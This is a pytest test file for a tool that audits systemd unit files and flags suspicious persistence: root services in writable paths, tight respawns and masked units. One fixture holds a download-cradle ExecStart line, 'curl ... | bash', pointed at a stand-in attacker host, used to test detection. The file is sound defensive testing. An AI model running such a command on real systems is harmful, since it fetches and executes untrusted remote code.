from __future__ import annotations

import json

import pytest

from linux_units import output
from linux_units.collect import collect
from linux_units.cli import main
from linux_units.unitfile import merge, parse_text

import _synth as S


def _by_name(res):
    return {u.name: u for u in res.units}


def test_parse_and_merge():
    base = parse_text("[Service]\nExecStart=/bin/true\nUser=nobody\n"
                      "[Install]\nWantedBy=multi-user.target\n")
    assert base.get("Service", "ExecStart") == "/bin/true"
    ov = parse_text("[Service]\nExecStart=\nExecStart=/bin/false\n")
    m = merge(base, ov)
    assert m.get_all("Service", "ExecStart") == ["/bin/false"]


def test_line_continuation():
    ud = parse_text("[Service]\nExecStart=/bin/sh -c 'echo one \\\n"
                    "  two three'\n")
    assert "two three" in ud.get("Service", "ExecStart")


def test_basic_inventory(tmp_path):
    S.unit(tmp_path, "usr/lib/systemd/system", "ssh.service",
           "[Unit]\nDescription=OpenSSH server\n"
           "[Service]\nExecStart=/usr/sbin/sshd -D\nRestart=on-failure\n"
           "RestartSec=30\n"
           "[Install]\nWantedBy=multi-user.target\n")
    S.enable(tmp_path, "etc/systemd/system", "multi-user.target.wants",
             "ssh.service")
    res = collect(str(tmp_path))
    u = _by_name(res)["ssh.service"]
    assert u.description == "OpenSSH server"
    assert u.exec_start == ["/usr/sbin/sshd -D"]
    assert u.enabled is True
    assert u.has_install is True
    assert not u.notable
    assert output.row(u)["severity"] == "none"


def test_dropin_merge_and_column(tmp_path):
    S.unit(tmp_path, "usr/lib/systemd/system", "app.service",
           "[Service]\nExecStart=/opt/app/bin/app\n")
    S.dropin(tmp_path, "etc/systemd/system", "app.service", "10-env.conf",
             "[Service]\nEnvironment=DEBUG=1\nExecStart=\n"
             "ExecStart=/opt/app/bin/app --verbose\n")
    u = _by_name(collect(str(tmp_path)))["app.service"]
    assert u.exec_start == ["/opt/app/bin/app --verbose"]
    assert u.drop_ins and "10-env.conf" in output.row(u)["drop_ins"]


def test_flag_writable_execstart(tmp_path):
    S.unit(tmp_path, "etc/systemd/system", "helper.service",
           "[Service]\nExecStart=/tmp/.x/helper\nUser=root\n"
           "[Install]\nWantedBy=multi-user.target\n")
    u = _by_name(collect(str(tmp_path)))["helper.service"]
    j = " ".join(u.notable)
    assert "user-writable" in j
    assert "runs as root from a writable path" in j
    assert output.row(u)["severity"] == "high"


def test_flag_download_cradle(tmp_path):
    S.unit(tmp_path, "etc/systemd/system", "sync.service",
           "[Service]\nType=oneshot\nRemainAfterExit=yes\n"
           "ExecStart=/bin/sh -c 'curl -s http://evil.example/x | bash'\n")
    u = _by_name(collect(str(tmp_path)))["sync.service"]
    assert any("download cradle" in x for x in u.notable)


def test_flag_enabled_without_install(tmp_path):
    S.unit(tmp_path, "usr/lib/systemd/system", "beacon.service",
           "[Service]\nExecStart=/usr/bin/beacon\n")
    S.enable(tmp_path, "etc/systemd/system", "multi-user.target.wants",
             "beacon.service")
    u = _by_name(collect(str(tmp_path)))["beacon.service"]
    assert u.enabled and not u.has_install
    assert any("no [Install] section" in x for x in u.notable)


def test_flag_tight_respawn(tmp_path):
    S.unit(tmp_path, "etc/systemd/system", "watchdog.service",
           "[Service]\nExecStart=/usr/local/bin/wd\nRestart=always\n"
           "RestartSec=1\n[Install]\nWantedBy=multi-user.target\n")
    u = _by_name(collect(str(tmp_path)))["watchdog.service"]
    assert any("RestartSec" in x for x in u.notable)


def test_masked_unit(tmp_path):
    import os
    d = tmp_path / "etc/systemd/system"
    d.mkdir(parents=True)
    try:
        os.symlink("/dev/null", d / "telemetry.service")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable")
    u = _by_name(collect(str(tmp_path)))["telemetry.service"]
    assert u.masked
    assert any("masked" in x for x in u.notable)


def test_cli_csv_json_filters(tmp_path):
    S.unit(tmp_path, "usr/lib/systemd/system", "a.service",
           "[Service]\nExecStart=/bin/a\n[Install]\nWantedBy=x.target\n")
    S.unit(tmp_path, "etc/systemd/system", "b.timer",
           "[Timer]\nOnCalendar=daily\n[Install]\nWantedBy=timers.target\n")
    csv_p = tmp_path / "u.csv"
    js_p = tmp_path / "u.json"
    rc = main([str(tmp_path), "--csv", str(csv_p), "--json", str(js_p), "-q"])
    assert rc == 0
    assert csv_p.read_bytes().startswith(b"\xef\xbb\xbf")
    data = json.loads(js_p.read_text())
    assert len(data) == 2

    main([str(tmp_path), "--type", "timer", "--json", str(js_p), "-q"])
    assert json.loads(js_p.read_text())[0]["name"] == "b.timer"


def test_csv_injection_guard(tmp_path):
    from linux_units.tracelib import sanitize
    assert sanitize("=x") == "'=x"


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
